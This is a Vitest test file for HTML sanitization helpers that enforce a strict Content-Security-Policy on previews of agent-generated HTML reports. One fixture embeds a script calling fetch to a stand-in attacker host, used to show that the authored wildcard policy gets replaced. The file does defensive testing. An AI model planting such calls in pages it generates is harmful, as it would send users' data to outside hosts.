// ========= Copyright 2025-2026 @ Eigent.ai All Rights Reserved. =========
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ========= Copyright 2025-2026 @ Eigent.ai All Rights Reserved. =========

import { describe, expect, it } from 'vitest';

import {
  buildPreviewContentSecurityPolicy,
  collectPreviewRemoteOrigins,
  injectPreviewContentSecurityPolicy,
  isStaticImageSrc,
  PREVIEW_CONTENT_SECURITY_POLICY,
  repairGeneratedReportBraces,
  stripScriptBlocks,
} from '@/lib/htmlSanitization';

describe('isStaticImageSrc', () => {
  it('accepts static relative paths', () => {
    expect(isStaticImageSrc('assets/home.png')).toBe(true);
  });

  it('rejects JS template literal expressions', () => {
    expect(isStaticImageSrc('${escapeHtml(node.image)}')).toBe(false);
    expect(isStaticImageSrc('assets/${node.id}.png')).toBe(false);
  });
});

describe('stripScriptBlocks', () => {
  it('removes script blocks so img scans skip JS template strings', () => {
    const html = `
      <img src="assets/home.png" alt="home">
      <script>
        const row = \`<img src="\${escapeHtml(node.image)}" alt="node">\`;
      </script >
    `;

    expect(stripScriptBlocks(html)).not.toContain('escapeHtml');
    expect(stripScriptBlocks(html)).toContain('assets/home.png');
  });
});

describe('HTML preview CSP', () => {
  it('replaces an agent-authored policy with the application policy', () => {
    const html = injectPreviewContentSecurityPolicy(`<!doctype html>
      <html><head>
        <meta http-equiv="Content-Security-Policy" content="default-src *">
      </head><body><script>fetch('https://attacker.example')</script></body></html>`);
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const policies = doc.querySelectorAll(
      'meta[http-equiv="Content-Security-Policy" i]'
    );

    expect(policies).toHaveLength(1);
    expect(policies[0].getAttribute('content')).toBe(
      PREVIEW_CONTENT_SECURITY_POLICY
    );
    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("default-src 'none'");
    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("connect-src 'none'");
    expect(PREVIEW_CONTENT_SECURITY_POLICY).not.toContain('https:');
    expect(PREVIEW_CONTENT_SECURITY_POLICY).not.toContain('navigate-to');
  });

  it('collects exact resource origins including import maps and font bytes', () => {
    const origins = collectPreviewRemoteOrigins(`<!doctype html><html><head>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron">
      <script type="importmap">{
        "imports": {
          "three": "https://unpkg.com/three@0.160.0/build/three.module.js"
        }
      }</script>
      <script>const telemetry = fetch('https://api.example/data');</script>
    </head><body>
      <a href="https://not-a-resource.example/private">link</a>
      <img src="https://images.example/report.png">
    </body></html>`);

    expect(origins).toEqual([
      'https://api.example',
      'https://fonts.googleapis.com',
      'https://fonts.gstatic.com',
      'https://images.example',
      'https://unpkg.com',
    ]);
  });

  it('grants only normalized HTTPS origins for an authorized preview', () => {
    const policy = buildPreviewContentSecurityPolicy([
      'https://unpkg.com/path/file.js',
      'https://unpkg.com/another.js',
      'http://insecure.example/script.js',
      'not a url',
    ]);

    expect(policy).toContain(
      "script-src 'unsafe-inline' data: blob: localfile: https://unpkg.com"
    );
    expect(policy).toContain('connect-src https://unpkg.com');
    expect(policy).not.toContain('insecure.example');
    expect(policy).not.toContain('navigate-to');
  });

  it('injects the authorized policy without preserving an authored wildcard', () => {
    const html = injectPreviewContentSecurityPolicy(
      '<html><head></head><body></body></html>',
      ['https://unpkg.com/module.js']
    );
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const policy = doc
      .querySelector('meta[http-equiv="Content-Security-Policy" i]')
      ?.getAttribute('content');

    expect(policy).toContain('https://unpkg.com');
    expect(policy).not.toContain('https:;');
  });
});

describe('generated report brace repair', () => {
  it('preserves valid nested CSS closing braces and all following HUD rules', () => {
    const html = `<!doctype html><html><head><style>
      @keyframes scan{to{left:110%}}
      @keyframes pulse{0%,100%{opacity:.55}50%{opacity:1}}
      .hud{position:fixed;z-index:10}
      #telemetry{top:30px;right:34px}
    </style></head><body><div class="hud" id="telemetry">online</div></body></html>`;

    expect(repairGeneratedReportBraces(html)).toBe(html);
  });

  it('repairs template-escaped CSS only when doubled opening braces exist', () => {
    const repaired = repairGeneratedReportBraces(
      '<html><head><style>.hud {{ display:block; }} #title {{ z-index:10; }}</style></head><body></body></html>'
    );

    expect(repaired).toContain('.hud { display:block; }');
    expect(repaired).toContain('#title { z-index:10; }');
    expect(repaired).not.toContain('{{');
  });
});
